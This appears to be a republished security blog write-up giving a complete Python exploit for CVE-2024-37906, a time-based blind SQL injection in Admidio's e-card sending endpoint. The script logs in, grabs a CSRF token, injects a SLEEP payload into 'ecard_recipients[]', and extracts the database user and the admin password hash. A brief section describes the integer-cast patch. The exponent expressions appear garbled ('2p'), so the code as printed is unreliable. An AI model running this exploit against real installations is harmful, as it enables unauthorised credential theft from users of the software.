# :game_die: Exit if no cookie was obtained

> **Original Source:** [Exit if no cookie was obtained](https://infosecwriteups.com/the-return-to-blogging-and-a-blind-sql-injection-2bee0a7fa779)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## Creating the exploit script


Having forced the application to execute arbitrary SQL code, it was time to create a script that would exploit the vulnerability automatically.


This is a good point to mention that the exploit requires a low privileged account, so before I could write the exploit logic, I first had to write the login functionality and session management.


```
"""Exploitation script for CVE-2024-37906."""

import sys
import requests


def login_func(url: str, username: str, password: str) -> dict | None:
"""Performs login request and returns session cookies or None on failure.

Args:
url: Base URL of Admidio installation.
username: Username to use for login request.
password: Password to use for login request.

Returns:
Session cookies on success, None on failure.
"""
data = {
"plg_usr_login_name": username,
"plg_usr_password": password,
}
session_cookie = "ADMIDIO_admidio_adm_SESSION_ID"

try:
response = requests.post(
f"{url}/adm_program/system/login.php?mode=check",
data=data,
timeout=5,
)
response.raise_for_status()

cookies = response.cookies.get_dict()
if session_cookie not in cookies:
print("No session cookie received!")
return None

return cookies

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


if __name__ == "__main__":
if len(sys.argv) != 4:
print("Usage: python3 CVE-2024-37906.py BASE_URL USERNAME PASSWORD")
print("Example: python3 CVE-2024-37906.py http://localhost/admidio-4.3.8 admin Password123")
sys.exit(1)

result = login_func(sys.argv[1], sys.argv[2], sys.argv[3])
print(result)
```


The code above implements the basic login functionality. It sends a request with the username and password, which are passed through the CLI, to the login endpoint. The function returns the session cookie for the user, which can be used for further requests.


I had to still implement a way to fetch the CSRF token, as the malicious request couldn’t be sent without a CSRF token. For that, I used the previous session cookie to send a GET request to the homepage and extract the CSRF token hidden inside the body of the response:


```
"""Exploitation script for CVE-2024-37906."""

import sys
import requests
from bs4 import BeautifulSoup


def login_func(url: str, username: str, password: str) -> dict | None:
"""Performs login request and returns session cookies or None on failure.

Args:
url: Base URL of Admidio installation.
username: Username to use for login request.
password: Password to use for login request.

Returns:
Dictionary on success, None on failure.
"""
data = {
"plg_usr_login_name": username,
"plg_usr_password": password,
}
session_cookie = "ADMIDIO_admidio_adm_SESSION_ID"

try:
response = requests.post(
f"{url}/adm_program/system/login.php?mode=check",
data=data,
timeout=5,
)
response.raise_for_status()

cookies = response.cookies.get_dict()
if session_cookie not in cookies:
print("No session cookie received!")
return None

return cookies

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


def get_csrf(url: str, cookie: dict) -> str | None:
"""Performs a GET request and returns the CSRF token as a string or None on failure.

Args:
url: Base URL of Admidio installation.
cookie: Session cookie obtained from the login_func.

Returns:
String on success, None on failure.
"""
csrf_token_name = "admidio-csrf-token"

try:
response = requests.get(
f"{url}/adm_program/overview.php",
cookies=cookie,
timeout=5
)
response.raise_for_status()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.select_one(f"input[name='{csrf_token_name}']")["value"]
if csrf_token is None:
print("No CSRF token received")
return None

return csrf_token

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


if __name__ == "__main__":
if len(sys.argv) != 4:
print("Usage: python3 CVE-2024-37906.py BASE_URL USERNAME PASSWORD")
print(
"Example: python3 CVE-2024-37906.py http://localhost/admidio-4.3.8 admin Password123"
)
sys.exit(1)

cookie = login_func(sys.argv[1], sys.argv[2], sys.argv[3])

if cookie is None:
# Exit if no cookie was obtained
sys.exit(1)

csrf_token = get_csrf(sys.argv[1], cookie)

if csrf_token is None:
# Exit if no CSRF token was obtained
sys.exit(1)

print(csrf_token)
```


>

Now that I look back at it, it might have been better to use session objects. You can learn more about them [here](https://requests.readthedocs.io/en/latest/user/advanced/#session-objects).


After the login functionality, I moved on to create the oracle. The idea of an oracle is to return either true or false depending on if a condition is met. In this case, the oracle should return true if the SQL statement passed to it returned true and false otherwise.


But how can we know if the SQL statement was successful? Well, we use the sleep function to sleep for X amount of seconds in case of a true statement, and our oracle uses the delay in the response to return true. If there is no delay, it means that the SQL statement was unsuccessful and the oracle should return false.


Now that I covered the theory, only the hard part was left and that was to actually implement the code:


```
"""Exploitation script for CVE-2024-37906."""

import sys
import requests
from bs4 import BeautifulSoup
import time
import uuid

# The time used to test an SQL query, reduce the number for faster execution.
DELAY = 1


def login_func(url: str, username: str, password: str) -> dict | None:
"""Performs login request and returns session cookies or None on failure.

Args:
url: Base URL of Admidio installation.
username: Username to use for login request.
password: Password to use for login request.

Returns:
Dictionary on success, None on failure.
"""
data = {
"plg_usr_login_name": username,
"plg_usr_password": password,
}
session_cookie = "ADMIDIO_admidio_adm_SESSION_ID"

try:
response = requests.post(
f"{url}/adm_program/system/login.php?mode=check",
data=data,
timeout=5,
)
response.raise_for_status()

cookies = response.cookies.get_dict()
if session_cookie not in cookies:
print("No session cookie received!")
return None

return cookies

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


def get_csrf(url: str, cookie: dict) -> str | None:
"""Performs a GET request and returns the CSRF token as a string or None on failure.

Args:
url: Base URL of Admidio installation.
cookie: Session cookie obtained from the login_func.

Returns:
String on success, None on failure.
"""
csrf_token_name = "admidio-csrf-token"

try:
response = requests.get(
f"{url}/adm_program/overview.php",
cookies=cookie,
timeout=5,
)
response.raise_for_status()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.select_one(f"input[name='{csrf_token_name}']")["value"]
if csrf_token is None:
print("No CSRF token received")
return None

return csrf_token

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


# Skeleton of the oracle function taken from the HTB Academy Module Blind SQL Injection
def oracle(url: str, query: str, cookie: dict, csrf_token: str) -> bool | None:
"""Serves as an oracle that evaluates expressions returning the evaluation on success or None on failure.

Args:
url: Base URL of Admidio installation.
query: SQL query that will be evaluated.
cookie: Cookie for the session previously obtained.
csrf_token: CSRF token previously obtained.

Returns:
Boolean on success, None on failure.
"""
data = {
"admidio-csrf-token": csrf_token,
"submit-action": "",
"photo_uuid": uuid.uuid4(),
"photo_nr": 1,
"ecard_template": "postcard.tpl",
"ecard_recipients[]": f"31337) OR (SELECT IF({query}, SLEEP({DELAY}), 'Dummy'))-- -",
"ecard_message": "Kind regards...",
}

try:
start = time.time()
requests.post(
f"{url}/adm_program/modules/ecards/ecard_send.php",
cookies=cookie,
data=data,
timeout=5,
)

return time.time() - start > DELAY

except requests.exceptions.RequestException as e:
print(f"Request failed: {e}")
return None


# Function taken from the HTB Academy Module Blind SQL Injection
def get_length(url: str, query: str, cookie: dict, csrf_token: str) -> int:
"""Gets the length of the response to the SQL query, returns the length on succes and 0 on failure.

Args:
url: Base URL of Admidio installation.
query: SQL query that will be evaluated.
cookie: Cookie for the session previously obtained.
csrf_token: CSRF token previously obtained.

Returns:
Integer on success and failure
"""
length = 0
for p in range(7):
if oracle(url, f"({query})&{2p}>0", cookie, csrf_token):
length |= 2p
return length


# Function taken from the HTB Academy Module Blind SQL Injection
def get_string(url: str, query: str, cookie: dict, csrf_token: str, length: int) -> str:
"""Retrieves the result of the SQL query, returns a string.

Args:
url: Base URL of Admidio installation.
query: SQL query that will be evaluated.
cookie: Cookie for the session previously obtained.
csrf_token: CSRF token previously obtained.
length: The length of the response

Returns:
String on success and failure
"""
val = ""
for i in range(1, length + 1):
c = 0
for p in range(7):
if oracle(
url, f"ASCII(SUBSTRING(({query}),{i},1))&{2p}>0", cookie, csrf_token
):
c |= 2p
val += chr(c)
return val


if __name__ == "__main__":
if len(sys.argv) != 4:
print("Usage: python3 CVE-2024-37906.py BASE_URL USERNAME PASSWORD")
print("Example: python3 CVE-2024-37906.py http://localhost/admidio-4.3.8 admin Password123")
sys.exit(1)

cookie = login_func(sys.argv[1], sys.argv[2], sys.argv[3])

if cookie is None:
# Exit if no cookie was obtained
sys.exit(1)

csrf_token = get_csrf(sys.argv[1], cookie)

if csrf_token is None:
# Exit if no CSRF token was obtained
sys.exit(1)

db_user_length = get_length(sys.argv[1], "LENGTH(USER())", cookie, csrf_token)

db_user = get_string(sys.argv[1], "USER()", cookie, csrf_token, db_user_length)
print(f"The current user: {db_user}")

password_length = get_length(
sys.argv[1],
"SELECT LENGTH(usr_password) from adm_users where usr_id=2",
cookie,
csrf_token,
)

password_hash = get_string(
sys.argv[1],
"SELECT usr_password from adm_users where usr_id=2",
cookie,
csrf_token,
password_length,
)
print(f"The password hash for the user with ID 2: {password_hash}")
```


Luckily for me, I didn’t need to make another request to obtain a valid ID for the “photo_uuid” variable, as any UUID supplied to it would allow for the vulnerability to still trigger.


In addition to the oracle function, I used the 2 functions get_length and get_string covered in one of the HTB CWEE modules to evaluate any query passed to them and return the length or result of the query. With that I only had to run the script one final time to verify that it works and lo and behold:


*Script returns the current user and the password hash for the admin user*


And the script only took ~600 seconds to execute 💀.


I’ll leave it as an exercise for the reader to improve the speed of this script.

## The patch


As the last part of this blog post, I’ll cover the patch used in version 4.3.9 and beyond to prevent the vulnerability.


While it may seem distant, the original vulnerability appeared due to the saving of user input into the array “arrayUsers[]”, which was then used inside a SQL query.


While the general advice is to use prepared statements when inserting user controlled data into a SQL query, the patch used a different way. Looking back at the code, the “arrayUsers[]” variable should only contain numbers, so the different way of preventing the vulnerability is to cast user data to an integer:

*Casting to an integer removes any string inside the variable*


The patch can be found [here](https://github.com/Admidio/admidio/commit/3ff02b0c64a6911ab3e81cd61077f392c0b25248).

## Conclusion and references


Hope you at least enjoyed the blog half as much as I enjoyed writing the exploit for the vulnerability. Stay tuned for more blog posts in the future, and give me a follow. If you have any questions, you can leave them in the comments, and I’ll get back to you ASAP.


References:

---

*Originally published on [Medium](https://infosecwriteups.com/the-return-to-blogging-and-a-blind-sql-injection-2bee0a7fa779). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
